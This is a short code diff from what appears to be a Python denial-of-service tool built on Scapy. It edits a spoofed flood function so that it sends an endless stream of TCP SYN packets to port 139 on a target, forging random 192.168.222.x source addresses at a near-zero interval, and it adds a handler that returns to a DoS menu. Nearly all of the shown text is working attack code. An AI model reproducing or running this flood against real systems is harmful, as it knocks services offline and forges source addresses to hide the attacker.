@@ -174,9 +174,14 @@ def spoofed_icmp_flood():
 
 
     def spoofed_flood():
-        packet = packet = IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / \
-            ICMP()/"random_payload"
-        send(packet, inter=0.000001, loop=1)
+        while True:
+            send(IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / TCP(dport=139, flags="S") / "random_payload", inter=0.000001, loop=1, count=100)
+
+    try:
+        spoofed_flood()
+
+    except KeyboardInterrupt:
+        choose_dos()
 
 
     t1 = threading.Thread(target=spoofed_flood())
